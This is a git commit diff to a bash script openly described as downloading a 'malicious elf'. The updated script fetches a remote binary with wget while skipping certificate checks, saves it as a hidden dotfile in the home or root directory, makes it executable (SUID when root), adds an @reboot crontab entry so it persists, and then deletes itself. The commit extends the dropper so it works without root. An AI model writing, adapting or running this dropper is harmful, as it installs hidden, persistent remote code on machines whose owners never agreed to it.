9a4546934375e1c2689017ccff7c9b75294efc92
calfcrusher <calfcrusher@inventati.org>
2021-08-18 10:24:36 +0200

    Update linux_elf.sh

--- linux_elf.sh
+++ linux_elf.sh
@@ -1,11 +1,5 @@
 #!/usr/bin/env bash
 
-# Check if script is running as root
-if [ "$EUID" -ne 0 ]
-  then echo "Please run as root"
-  exit
-fi
-
 # Save wget location
 WGET=$(which wget)
 
@@ -18,18 +12,31 @@ PAYLOAD=$RANDOM
 # Add dot to make hidden file
 PAYLOAD=".${PAYLOAD}"
 
-# Download malicious elf
-$WGET -q --no-check-certificate "${URL}" -O /root/$PAYLOAD
+# Check if script is running as root or user, set persistence consequentially
+if [ "$EUID" -ne 0 ]
+then
+  # Download malicious elf
+  $WGET -q --no-check-certificate "${URL}" -O ~/$PAYLOAD
+  # Make macho executable
+  chmod +x ~/$PAYLOAD
+  # Persistence in crontab
+  crontab -l > temp_cron > /dev/null 2>&1
+  echo "@reboot sleep 30; ~/$PAYLOAD 2>&1" >> temp_cron
+  crontab temp_cron
+  rm temp_cron
+else
+  # Download malicious elf
+  $WGET -q --no-check-certificate "${URL}" -O /root/$PAYLOAD
+  # Make macho executable and set suid
+  chmod u+s /root/$PAYLOAD
+  chmod +x /root/$PAYLOAD
+  # Persistence in crontab
+  crontab -l > temp_cron > /dev/null 2>&1
+  echo "@reboot sleep 30; /root/$PAYLOAD 2>&1" >> temp_cron
+  crontab temp_cron
+  rm temp_cron
 
-# Make suid executable :)
-chmod u+s /root/$PAYLOAD
-chmod +x /root/$PAYLOAD
-
-# Persistence in crontab
-crontab -l > temp_cron > /dev/null 2>&1
-echo "@reboot sleep 30; /root/$PAYLOAD 2>&1" >> temp_cron
-crontab temp_cron
-rm temp_cron
+fi
 
 # Remove itself 
 rm elf_crontab.sh 2>&1
